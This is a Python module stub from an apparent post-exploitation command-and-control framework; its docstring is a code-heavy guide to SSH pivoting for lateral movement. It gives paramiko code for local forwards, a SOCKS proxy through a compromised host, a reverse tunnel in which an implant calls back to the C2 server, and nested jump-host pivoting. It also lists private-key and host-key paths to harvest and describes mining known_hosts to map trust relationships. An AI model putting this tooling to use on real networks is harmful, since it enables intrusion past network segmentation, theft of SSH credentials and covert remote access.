"""STUB — SSH pivoting and tunnelling.

Uses an SSH session on a pivot host to reach otherwise-inaccessible internal
networks.  Three primary modes: local port forward, dynamic SOCKS proxy,
and reverse tunnel (implant calls back through an SSH target to the C2).

──────────────────────────────────────────────────────────────────────────────
IMPLEMENTATION GUIDE
──────────────────────────────────────────────────────────────────────────────

pip install paramiko

CONCEPT: NETWORK SEGMENTATION BYPASS
--------------------------------------
   [Operator/C2]          [Pivot host]          [Internal target]
   10.0.0.1               192.168.1.5            10.10.10.50:443
       |                       |                      |
       |-- SSH session ------> |                      |
       |<-- local port fwd --- | <--- TCP ----------> |
   localhost:4443  <----------- forwards to --------> 10.10.10.50:443

The pivot host has two network interfaces: one reachable from the C2, one on
the internal network.


MODE 1: LOCAL PORT FORWARD (access internal service via pivot)
--------------------------------------------------------------
Equivalent to: ssh -L local_port:internal_host:internal_port user@pivot

  import socket, threading
  import paramiko

  def local_forward(pivot_host, pivot_port, pivot_user, pivot_key_path,
                    bind_port, dest_host, dest_port):

      transport = paramiko.Transport((pivot_host, pivot_port))
      transport.connect(username=pivot_user,
                        pkey=paramiko.RSAKey.from_private_key_file(pivot_key_path))

      def handle(local_sock):
          chan = transport.open_channel(
              "direct-tcpip",
              dest_addr=(dest_host, dest_port),
              src_addr=("127.0.0.1", bind_port),
          )
          # Bidirectional relay between local_sock and chan
          def relay(src, dst):
              while True:
                  data = src.recv(4096)
                  if not data:
                      break
                  dst.sendall(data)
          t1 = threading.Thread(target=relay, args=(local_sock, chan), daemon=True)
          t2 = threading.Thread(target=relay, args=(chan, local_sock), daemon=True)
          t1.start(); t2.start()
          t1.join(); t2.join()

      server = socket.socket()
      server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
      server.bind(("127.0.0.1", bind_port))
      server.listen(10)
      while True:
          client_sock, _ = server.accept()
          threading.Thread(target=handle, args=(client_sock,), daemon=True).start()

  # Now traffic to localhost:bind_port is forwarded through pivot to dest_host:dest_port


MODE 2: DYNAMIC SOCKS5 PROXY
------------------------------
Equivalent to: ssh -D 1080 user@pivot
All traffic routed through the SOCKS5 proxy at localhost:1080 is forwarded
via the pivot — gives access to the entire internal network.

  # Implement a SOCKS5 server locally; for each new connection open a
  # direct-tcpip channel on the transport to the destination.

  # SOCKS5 handshake (RFC 1928):
  #   Client:  0x05 0x01 0x00          (VER=5, NMETHODS=1, METHOD=NO_AUTH)
  #   Server:  0x05 0x00               (VER=5, METHOD=NO_AUTH accepted)
  #   Client:  0x05 0x01 0x00 0x03 <len> <host> <port_hi> <port_lo>
  #   Server:  0x05 0x00 0x00 0x01 <4-byte IP> <2-byte port>  (success)

  # Open the channel after parsing the destination from the SOCKS request:
  chan = transport.open_channel(
      "direct-tcpip",
      dest_addr=(dest_host, dest_port),
      src_addr=("127.0.0.1", 1080),
  )

  # Or use a library that implements the SOCKS5 server for you:
  pip install sshtunnel
  from sshtunnel import SSHTunnelForwarder
  # sshtunnel handles local port forwards; for full SOCKS you'd use pysocks + paramiko


MODE 3: REVERSE TUNNEL (implant on pivot phones back to C2)
------------------------------------------------------------
Equivalent to: ssh -R c2_listen_port:localhost:22 c2_user@c2_host
The pivot initiates an outbound SSH connection to the C2 and asks the C2 to
forward inbound connections on c2_listen_port back to the pivot's localhost:22.

  transport = paramiko.Transport((c2_host, c2_ssh_port))
  transport.connect(username=c2_user, password=c2_password)

  # Request remote port forwarding:
  transport.request_port_forward("", c2_listen_port)

  def accept_handler(channel):
      # channel is a new connection coming from the C2's c2_listen_port
      # relay it to localhost:22 on the pivot
      local = socket.create_connection(("127.0.0.1", 22))
      # ... relay bidirectionally as in MODE 1

  transport.set_keepalive(30)
  while True:
      chan = transport.accept(timeout=60)   # blocks until inbound connection
      if chan:
          threading.Thread(target=accept_handler, args=(chan,), daemon=True).start()


MODE 4: JUMP HOST / NESTED PIVOTING
-------------------------------------
Equivalent to: ssh -J user@hop1,user@hop2 user@final_target

  # Paramiko: use the first hop as the sock parameter for the second transport
  sock_to_hop1 = paramiko.Transport(("hop1", 22))
  sock_to_hop1.connect(username="user1", pkey=key1)
  chan_to_hop2 = sock_to_hop1.open_channel(
      "direct-tcpip", dest_addr=("hop2", 22), src_addr=("hop1", 0)
  )
  transport2 = paramiko.Transport(chan_to_hop2)   # wrap the channel as a socket
  transport2.connect(username="user2", pkey=key2)
  # Now open channels on transport2 to reach hop2's network


KEY HARVESTING (find SSH keys on the pivot to reuse)
-----------------------------------------------------
  # Paths to check for private keys:
  key_paths = [
      "~/.ssh/id_rsa", "~/.ssh/id_ecdsa", "~/.ssh/id_ed25519",
      "~/.ssh/id_dsa",
      "/root/.ssh/id_rsa",
      "/etc/ssh/ssh_host_rsa_key",       # host key — reveals server identity
  ]
  # Check known_hosts for targets this host has connected to:
  #   ~/.ssh/known_hosts — format: <hostname> <keytype> <base64-key>
  #   Use this to map out trust relationships / reachable hosts.

  # Load a key with passphrase:
  pkey = paramiko.RSAKey.from_private_key_file("id_rsa", password="passphrase")
  # or for encrypted keys without passphrase: try None, catch paramiko.PasswordRequiredException


ARGS EXPECTED BY THIS MODULE
-----------------------------
  {
    "mode":          "local_fwd" | "socks" | "reverse",
    "pivot_host":    "192.168.1.5",
    "pivot_port":    22,
    "pivot_user":    "ubuntu",
    "pivot_key":     "/path/to/id_rsa",     # or "pivot_password"
    "pivot_password": "",
    # For local_fwd and socks:
    "bind_port":     1080,
    "dest_host":     "10.10.10.50",          # local_fwd only
    "dest_port":     443,                    # local_fwd only
    # For reverse:
    "c2_host":       "10.0.0.1",
    "c2_port":       22,
    "c2_user":       "c2user",
    "c2_listen_port": 2222,
  }
"""

from post.base import ModuleResult, PostModule
from post.loader import register


@register
class SSHPivotModule(PostModule):
    NAME = "lateral/ssh"
    DESCRIPTION = "STUB — SSH tunnelling: local port forward, SOCKS5 proxy, reverse tunnel"
    PLATFORM = ["linux", "darwin", "windows"]
    IMPLEMENTED = False

    def run(self, args: dict | None = None) -> ModuleResult:
        raise NotImplementedError(
            "See post/lateral/ssh.py docstring: paramiko.Transport + "
            "open_channel('direct-tcpip') for local/SOCKS, "
            "request_port_forward for reverse tunnels."
        )
